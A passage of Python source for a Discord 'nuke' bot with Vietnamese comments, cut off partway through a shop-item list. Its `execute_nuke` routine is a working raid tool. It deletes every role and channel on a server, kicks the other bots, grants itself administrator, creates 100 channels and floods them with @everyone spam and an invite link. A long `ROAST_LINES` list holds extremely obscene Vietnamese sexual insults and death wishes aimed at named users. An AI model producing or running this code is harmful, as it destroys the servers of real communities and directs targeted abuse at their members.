import asyncio
import os
import sys
import random
import discord
from discord.ext import commands
import aiohttp
from datetime import timedelta, datetime, timezone
import json
import math
import re
import time
from typing import Optional, Union

# ==================== KEEP_ALIVE ====================
try:
    from keep_alive import keep_alive
except ImportError:
    def keep_alive():
        pass

# ==================== CẤU HÌNH ====================
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise RuntimeError("❌ Chưa có TOKEN. Hãy đặt biến môi trường TOKEN.")

BOT_OWNERS = {
    1540585511842881616,
    1542453882263707759,
    1502969774202814625,
}

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.bans = True
intents.moderation = True
intents.webhooks = True
intents.reactions = True

def get_prefix(bot, message):
    prefixes = ('n!', 'N!', 'n! ', 'N! ', 'nuked ', 'NUKED ')
    for p in prefixes:
        if message.content.startswith(p):
            return p
    return 'n! '

bot = commands.Bot(command_prefix=get_prefix, intents=intents, case_insensitive=True)
bot.remove_command('help')

# ==================== BIẾN TOÀN CỤC ====================
spam_task_running = None
is_spamming = False
bot_enabled = True

SERVER_LOG_CHANNELS = {}
WELCOME_CHANNELS = {}
GOODBYE_CHANNELS = {}
SERVER_LEVEL_CHANNELS = {}
DISABLED_COMMANDS = set()

USER_LEVELS = {}
user_coins = {}
user_inventory = {}
marriages = {}
daily_cooldowns = {}
warnings = {}
temp_bans = {}
user_effects = {}

webhooks = {}

LEVEL_FILE = "levels.json"
CONFIG_FILE = "config.json"
COIN_FILE = "coins.json"
INVENTORY_FILE = "inventory.json"
MARRIAGE_FILE = "marriages.json"
DAILY_FILE = "daily.json"
WARN_FILE = "warnings.json"
EFFECT_FILE = "effects.json"
TEMP_BAN_FILE = "temp_bans.json"
BACKUP_DIR = "backups"

MAX_LEVEL = 670
XP_PER_MESSAGE = 10
XP_COOLDOWN_SECONDS = 30

# ==================== TẢI / LƯU ====================
def load_json(file, default={}):
    try:
        with open(file, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return default

def save_json(file, data):
    temp = f"{file}.tmp"
    with open(temp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    os.replace(temp, file)

def load_all_data():
    global USER_LEVELS, user_coins, user_inventory, marriages, daily_cooldowns
    global SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS
    global BOT_OWNERS, DISABLED_COMMANDS, warnings, temp_bans, user_effects

    USER_LEVELS = load_json(LEVEL_FILE, {})
    user_coins = load_json(COIN_FILE, {})
    user_inventory = load_json(INVENTORY_FILE, {})
    marriages = load_json(MARRIAGE_FILE, {})
    daily_cooldowns = load_json(DAILY_FILE, {})
    warnings = load_json(WARN_FILE, {})
    temp_bans = load_json(TEMP_BAN_FILE, {})
    user_effects = load_json(EFFECT_FILE, {})
    config = load_json(CONFIG_FILE, {})
    SERVER_LOG_CHANNELS = config.get("log_channels", {})
    WELCOME_CHANNELS = config.get("welcome_channels", {})
    GOODBYE_CHANNELS = config.get("goodbye_channels", {})
    SERVER_LEVEL_CHANNELS = config.get("level_channels", {})
    saved_owners = config.get("owners", [])
    if saved_owners:
        BOT_OWNERS = set(int(x) for x in saved_owners)
    DISABLED_COMMANDS = set(config.get("disabled_commands", []))

def save_all_data():
    save_json(LEVEL_FILE, USER_LEVELS)
    save_json(COIN_FILE, user_coins)
    save_json(INVENTORY_FILE, user_inventory)
    save_json(MARRIAGE_FILE, marriages)
    save_json(DAILY_FILE, daily_cooldowns)
    save_json(WARN_FILE, warnings)
    save_json(TEMP_BAN_FILE, temp_bans)
    save_json(EFFECT_FILE, user_effects)
    config = {
        "log_channels": SERVER_LOG_CHANNELS,
        "welcome_channels": WELCOME_CHANNELS,
        "goodbye_channels": GOODBYE_CHANNELS,
        "level_channels": SERVER_LEVEL_CHANNELS,
        "owners": list(BOT_OWNERS),
        "disabled_commands": list(DISABLED_COMMANDS)
    }
    save_json(CONFIG_FILE, config)

load_all_data()

# ==================== HẰNG SỐ ====================
CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/0b/5c/dd/0b5cddb5352ae325e8bcbd8ae8d448f9.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/7c/12/72/7c12727320e9107bd656c581af98067f.gif"
NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg"
HELP_THUMBNAIL_GIF = "https://i.pinimg.com/originals/56/00/5a/56005a1acfe12d3df3e97c646d81b561.gif"
MENU_GIF = "https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif"
LEVEL_GIF = "https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif"
WELCOME_GIF = "https://i.pinimg.com/originals/54/19/c9/5419c9ce3ffade43b2837daa2c96b1d9.gif"
GOODBYE_GIF = "https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif"

ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn giải nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ giải thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn giải đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn giải nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ giải nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn giải đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn giải thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn giải chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀",
]

# ==================== HÀM TIỆN ÍCH ====================
def get_required_exp(level: int) -> int:
    return max(100, level * 100)

def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

def add_coins(user_id, amount):
    uid = str(user_id)
    user_coins[uid] = user_coins.get(uid, 0) + amount
    save_json(COIN_FILE, user_coins)

def subtract_coins(user_id, amount):
    uid = str(user_id)
    cur = user_coins.get(uid, 0)
    if cur < amount:
        return False
    user_coins[uid] = cur - amount
    save_json(COIN_FILE, user_coins)
    return True

def get_user_level(user_id):
    uid = str(user_id)
    if uid not in USER_LEVELS:
        USER_LEVELS[uid] = {"level": 1, "exp": 0}
        save_json(LEVEL_FILE, USER_LEVELS)
    return USER_LEVELS[uid]["level"]

def add_exp(user_id, exp):
    uid = str(user_id)
    if uid not in USER_LEVELS:
        USER_LEVELS[uid] = {"level": 1, "exp": 0}
    USER_LEVELS[uid]["exp"] += exp
    lv = USER_LEVELS[uid]["level"]
    while USER_LEVELS[uid]["exp"] >= get_required_exp(lv):
        USER_LEVELS[uid]["exp"] -= get_required_exp(lv)
        USER_LEVELS[uid]["level"] += 1
        lv += 1
    save_json(LEVEL_FILE, USER_LEVELS)
    return USER_LEVELS[uid]["level"]

async def send_log(guild_id, embed):
    for gid, chid in SERVER_LOG_CHANNELS.items():
        if int(gid) == guild_id:
            channel = bot.get_channel(chid)
            if channel:
                try:
                    await channel.send(embed=embed)
                except:
                    pass

async def check_and_assign_level_roles(member: discord.Member, current_level: int):
    role_permissions_map = {
        20: {"name": "LV 20 - Ping Everyone", "perms": discord.Permissions(mention_everyone=True)},
        200: {"name": "LV 200 - Manage Channels/Roles", "perms": discord.Permissions(manage_channels=True, manage_roles=True)},
        300: {"name": "LV 300 - All Channels Access", "perms": discord.Permissions(view_channel=True)},
        400: {"name": "LV 400 - Server Manager", "perms": discord.Permissions(manage_guild=True)},
        500: {"name": "LV 500 - Admin Server", "perms": discord.Permissions(administrator=True)},
        670: {"name": "LV 670 - Owner Server", "perms": discord.Permissions(administrator=True)}
    }
    for req_lv, r_data in role_permissions_map.items():
        if current_level >= req_lv:
            role = discord.utils.get(member.guild.roles, name=r_data["name"])
            if not role:
                try:
                    role = await member.guild.create_role(name=r_data["name"], permissions=r_data["perms"], hoist=True)
                except:
                    continue
            if role and role not in member.roles:
                try:
                    await member.add_roles(role)
                except:
                    pass

def is_owner_id(user_id):
    return int(user_id) in BOT_OWNERS

def owner_only():
    async def predicate(ctx):
        if is_owner_id(ctx.author.id):
            return True
        raise commands.CheckFailure("Owner only")
    return commands.check(predicate)

def command_disabled(name):
    return name.lower() in {str(x).lower() for x in DISABLED_COMMANDS}

def make_embed(title, description="", color=discord.Color.blurple(), thumbnail=None):
    embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.now(timezone.utc))
    if thumbnail:
        embed.set_thumbnail(url=thumbnail)
    embed.set_footer(text="Nuked Bot • Ultimate Edition • Boss Bảo")
    return embed

def success(title, description):
    return make_embed(f"✅ {title}", description, discord.Color.green())

def fail(description):
    return make_embed("❌ Không thể thực hiện", description, discord.Color.red())

def owner_embed(title, description):
    return make_embed(f"👑 {title}", description, discord.Color.gold())

def parse_duration(value):
    if not value or len(value) < 2:
        return None
    unit = value[-1].lower()
    try:
        number = int(value[:-1])
    except ValueError:
        return None
    if number <= 0:
        return None
    units = {
        "s": timedelta(seconds=number),
        "m": timedelta(minutes=number),
        "h": timedelta(hours=number),
        "d": timedelta(days=number),
        "w": timedelta(weeks=number),
        "t": timedelta(days=number*30)
    }
    return units.get(unit)

def hierarchy_error(target, author):
    if target == author:
        return "Bạn không thể áp dụng thao tác này lên chính mình."
    if target.top_role >= author.top_role:
        return "Role cao nhất của mục tiêu phải thấp hơn role cao nhất của bạn."
    if target.top_role >= target.guild.me.top_role:
        return "Bot không có role đủ cao để thao tác với thành viên này."
    return None

# ==================== VIEW NUKE ====================
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("✅ Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"❌ Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        nuke_log_embed = discord.Embed(
            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
            color=0xFF0000
        )
        await send_log(guild.id, nuke_log_embed)

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            tasks.append(guild.edit(name="NUKE BY BỐ BẢO ĐZ"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
            chunk_size = 10
            for i in range(0, len(bot_members), chunk_size):
                chunk = bot_members[i:i + chunk_size]
                kick_tasks = [m.kick(reason="Anti-bot / Nuke cleanup") for m in chunk]
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        channels_to_delete = list(guild.channels)
        for i in range(0, len(channels_to_delete), 15):
            batch = channels_to_delete[i:i+15]
            del_tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*del_tasks, return_exceptions=True)
            await asyncio.sleep(1.0)

        created_channels = []
        for i in range(0, 100, 60):
            batch_create = []
            for j in range(i, min(i + 60, 100)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch_create.append(guild.create_text_channel(name=channel_name))
            res = await asyncio.gather(*batch_create, return_exceptions=True)
            for r in res:
                if isinstance(r, discord.TextChannel):
                    created_channels.append(r)
            await asyncio.sleep(2.0)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
        )

        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        for _ in range(10):
            batch_spam = []
            for _ in range(250):
                ch = random.choice(valid_channels) if valid_channels else None
                if ch:
                    async def send_fast(c=ch):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await c.send(spam_content, embed=embed)
                        except:
                            pass
                    batch_spam.append(send_fast())
            if batch_spam:
                await asyncio.gather(*batch_spam, return_exceptions=True)
            await asyncio.sleep(1.0)

        complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
        await send_log(guild.id, complete_log_embed)

    except Exception as e:
        print(f"Lỗi khi thực hiện nuke: {e}")

# ==================== VIEW RESTORE ====================
class RestoreConfirmView(discord.ui.View):
    def __init__(self, ctx, backup_data, filename):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.backup_data = backup_data
        self.filename = filename

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="✅ ĐỒNG Ý RESTORE", style=discord.ButtonStyle.green)
    async def confirm_restore(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏳ Đang khôi phục server...", ephemeral=True)
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await restore_process(self.ctx, self.backup_data, self.filename)

    @discord.ui.button(label="❌ HỦY", style=discord.ButtonStyle.red)
    async def cancel_restore(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message("❌ Đã hủy lệnh restore.", ephemeral=True)
        self.stop()

async def restore_process(ctx, backup_data, filename):
    try:
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        for role_data in backup_data.get("roles", []):
            perms = discord.Permissions(role_data["permissions"])
            try:
                color_hex = role_data.get("color", "#000000")
                if color_hex.startswith("#"):
                    color = discord.Color(int(color_hex.strip("#"), 16))
                else:
                    color = discord.Color.default()
            except:
                color = discord.Color.default()
            try:
                await guild.create_role(
                    name=role_data["name"],
                    permissions=perms,
                    color=color,
                    hoist=True
                )
            except:
                pass
        for channel_data in backup_data.get("channels", []):
            name = channel_data["name"]
            ctype = channel_data["type"]
            position = channel_data.get("position", 0)
            try:
                if ctype == "text":
                    await guild.create_text_channel(name=name, position=position)
                elif ctype == "voice":
                    await guild.create_voice_channel(name=name, position=position)
            except:
                pass
        embed = discord.Embed(
            title="✅ ĐÃ RESTORE SERVER",
            description=f"🎉 Server **{guild.name}** đã được khôi phục từ file `{filename}`.",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống restore Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi restore: {str(e)}")

# ==================== SHOP ITEMS ====================
SHOP_ITEMS = {
    "🍀 Lá Cỏ May Mắn": {
        "price": 500,
        "effect_type": "win_rate_boost",
        "effect_value": 0.1,
        "duration": 1,
        "desc": "Tăng 10% tỉ lệ thắng cho 1 ván chơi"
    },
    "🍀 Bùa May Mắn Cấp 2": {
        "price": 1200,
